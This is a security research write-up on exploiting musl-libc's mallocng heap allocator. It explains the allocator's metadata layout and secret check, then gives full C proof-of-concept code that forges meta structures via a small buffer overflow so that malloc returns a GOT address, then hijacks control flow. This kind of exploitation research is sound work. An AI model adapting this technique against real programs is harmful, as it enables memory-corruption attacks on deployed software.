# Some notes on attacking musl-libc's new heap allocator
I did this research at the end of 2021, but never published it because my friend pointed out that it was actually the subject of a challenge in the DEFCON 2021 CTF. There is a good write up [here](https://ctftime.org/writeup/28214). Their technique uses an unlink attack and a fake filestream (house of orange style). The one I came up with leverages multiple writes to a fake metadata object so that it is handled differently betweeen calls to malloc/free (house of rabbit style). This gets an arbitrary address returned from malloc. I'm publishing the notes now as CV padding.

## TL;DR
* Buffer overflows into in-band metadata can't be used to exploit the allocator, unless you can leak `__malloc_context.secret`.
* If you can leak the secret and the heap address, you can use a 4-byte buffer overflow to create a situation where an arbitrary address is returned from malloc.
* Corrupting adjacent chunk user data is still possible for application-specific attacks, (e.g. a vtable pointer on the heap).
* UAFs will always lead to application-specific attacks unless a sanitiser is being used.

## Allocator structure
* In mallocng, each chunk of memory returned by `malloc()` is called a "slot".
* Slots are stored within something called a "group".
* Groups hold a number of slots of the same size.
* There is a small amount of in-band metadata stored between each slot, so that `free()` can find the group address from any slot address.
* Most of the important metadata is stored out of band, in "meta" objects.
* Each group object has a pointer to its corresponding meta object.

The structure of a group object can be seen below:
```c
struct group {
	struct meta *meta;	    // Pointer to corresponding meta object
	unsigned char active_idx:5;
	char pad[UNIT - sizeof(struct meta *) - 1];
	unsigned char storage[];    // Addresses returned by malloc are all within this array
};
```

* Meta objects track important information such as:
    * the size class of the group
    * a bitmap of which chunks are available
    * a bitmap of which chunks have been `free()`'d
    * a pointer back to the group object
* Meta objects are also stored in a doubly-linked list for each size class, allowing them to be quickly traversed when `malloc()` is looking for an available slot.

The structure of a meta object can be seen below:
```c
struct meta {
	struct meta *prev, *next;		// Doubly-linked list of metas
	struct group *mem;			// Pointer back to the group object
	volatile int avail_mask, freed_mask;	// Largebin-style bitmaps
	uintptr_t last_idx:5;			// Index of final slot in the group
	uintptr_t freeable:1;
	uintptr_t sizeclass:6;			// Size class
	uintptr_t maplen:8*sizeof(uintptr_t)-12;
};
```

* The meta objects themselves are stored in something called a "meta_area".
* Meta areas contain a secret value that is used to verify their integrity.
* Meta areas are stored in a singly linked list, the head and tail of which is stored in the malloc context.
* A guard page is created at the start of every meta_area XXX?

The structure of a meta_area can be seen below:
```c
struct meta_area {
	uint64_t check;		// Secret used to verify integrity, must match __malloc_context.secret
	struct meta_area *next;	// Singly-linked list of meta_areas
	int nslots;		// Number of metas in this area
	struct meta slots[];	// Meta objects are stored in this array
};
```

## How is the secret generated?
The 64-bit secret used to verify meta_area structures is generated during program startup using `get_random_secret()`. The random value comes from the AT_RANDOM auxilliary vector. If there is no AT_RANDOM in auxv, the stack address is used as a simple source of entropy:
```c
static inline uint64_t get_random_secret()
{
	uint64_t secret = (uintptr_t)&secret * 1103515245;  // Fallback to stack address
	for (size_t i=0; libc.auxv[i]; i+=2)
		if (libc.auxv[i]==AT_RANDOM)
			memcpy(&secret, (char *)libc.auxv[i+1]+8, sizeof secret);
	return secret;
}
```

If for some reason AT_RANDOM isn't present in auxv then it should be possible to derive the malloc secret from a stack leak, as long as the leaked stack address is at a reliable offset (the stack frame for `main` is always at offset +1336 from the `get_random_secret` frame on my machine). Realistically there should always be a value for AT_RANDOM in auxv though.

## How can we attack it?
In order to bypass all these mitigations we need the following:
* A way to leak the malloc secret (e.g. an arbitrary read primitive)
* A way to craft a fake meta_area and meta object at the correct alignment:
    * Meta_areas must be aligned to the page boundary (`p & -4096`).
    * Meta objects must be stored somewhere after the meta_area, within the same page.
    * We need to know the address of the meta object (the meta_area adress can be easily derived from this).
* The ability to write a target address to the fake meta structure, after it has been processed by free/)

If the above conditions are met, we can cause a fake meta_area to be linked into `__malloc_context.active[sizeclass]`. Once the current meta_area is emptied, our fake meta object is used, allowing a controlled address to be returned by malloc.

I've provided the following source code to demonstrate this attack:
```c
// Compile without PIE:
// musl-gcc fake_meta.c -no-pie -o fakemeta
#include <stdlib.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>

// free@got.plt, might be different on your machine
// I chose free because its metadata doesn't overlap puts@got.plt when treated as a slot
// Check out the "Mooosl" DEFCON CTF write-up for a good example targeting filestream vtables instead
#define FREE_GOTPLT 0x404040

#define MMAP_THRESHOLD 131052
#define UNIT 16

struct _group {
	struct _meta *meta;
	unsigned char active_idx:5;
	char pad[UNIT - sizeof(struct _meta *) - 1];
	unsigned char storage[];
};

struct _meta {
	struct _meta *prev, *next;
	struct _group *mem;
	volatile int avail_mask, freed_mask;
	uintptr_t last_idx:5;
	uintptr_t freeable:1;
	uintptr_t sizeclass:6;
	uintptr_t maplen:8*sizeof(uintptr_t)-12;
};

struct _meta_area {
	uint64_t check;
	struct _meta_area *next;
	int nslots;
	struct _meta slots[];
};

int _get_slot_index(const unsigned char *p) {
    return p[-3] & 31;
}

struct _meta *_get_meta(const unsigned char *p) {
    int offset = *(const uint16_t *)(p - 2);
    int index = _get_slot_index(p);
    // Special case for chunks with offset > 0xffff
    if (p[-4]) { offset = *(uint32_t *)(p - 8); }
    const struct _group *base = (const void *)(p - UNIT*offset - UNIT);
    const struct _meta *meta = base->meta;
    const struct _meta_area *area = (void *)((uintptr_t)meta & -4096);
    return (struct _meta *)meta;
}


// Simple function to demonstrate that we have control over RIP
void get_flag() {
    printf("flag{R1P_C0NTROL_CONFIRMED}\n");
}

int main(void)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    // Alternate target, leaving in for .data padding
    static char target[32] = "XXXXXXXXXXX";

    // Allocate 2 slots of size 120 (sizeclass = 7)
    char *a = malloc(120);
    char *b = malloc(120);

    printf("Leaking A: 0x%08x\n", a);

    struct _meta *b_meta = _get_meta(b);
    uint64_t malloc_secret = ((struct _meta_area *)((size_t)b_meta & -4096))->check;
    printf("Leaking malloc_secret: 0x%x\n", malloc_secret);

    // Allocating a big slot that we can store a fake meta_area in
    char *big_slot = malloc(MMAP_THRESHOLD);

    // Fake meta area needs to be page aligned
    struct _meta_area *fake_area = (void *)(((size_t)big_slot + 5000) & -4096);
    fake_area->check = ((struct _meta_area *)((size_t)b_meta & -4096))->check;

    // Fake meta with a group pointer into the start of slot A's user data
    // We create a fake group at the start of A in the next step
    struct _meta *fake_meta = (size_t)fake_area + 128;
    fake_meta->mem = a;
    fake_meta->sizeclass = 7;
    fake_meta->last_idx = 0;
    fake_meta->avail_mask = 0;
    fake_meta->freed_mask = 0;

    printf("Leaking fake_meta: 0x%08x\n", fake_meta);

    // Now for the overflow
    int overflow_target = b - a - 2;
    printf("We need to overflow A by %d bytes to hit B's in-band metadata\n", overflow_target);

    // We make sure that slot A begins with a fake group pointing to our fake meta object
    *(uintptr_t *)a = fake_meta;

    // BoF padding up to slot B's metadata
    char *c = a + 8;
    for (; c < (b - 4); *c++ = 'A');

    // Index metadata, needs to be 0
    *(uint16_t *)c = 0;

    printf("Smashing slot B's \"offset\" metadata @ 0x%08x\n", c + 2);
    // Normally the offset would be 8, set to 7 so that free() will think the group struct is inside of slot A's user data
    *(uint16_t *)(c + 2) = 7;

    // Free chunk B, this should link our fake meta_area into malloc_ctx.active[7]
    free(b);

    printf("Now we modify the fake meta to point to free@got.plt: 0x%08x\n", FREE_GOTPLT);
    fake_meta->mem = FREE_GOTPLT - sizeof(struct _group) - 6;   // -6 offset to satisfy *(uint16_t *)(p - 2) == 0

    // Empty remaining slots from the size 7 meta
    for (int i = 0; i < 5; i++) {
        malloc(120);
    }

    char *overlap = malloc(120);
    printf("Malloc returned target address 0x%08x\n", overlap);

    printf("Demonstrating RIP control\n");
    *(void **)(overlap+6) = get_flag;
    free(overlap);

    return 0;
}
```
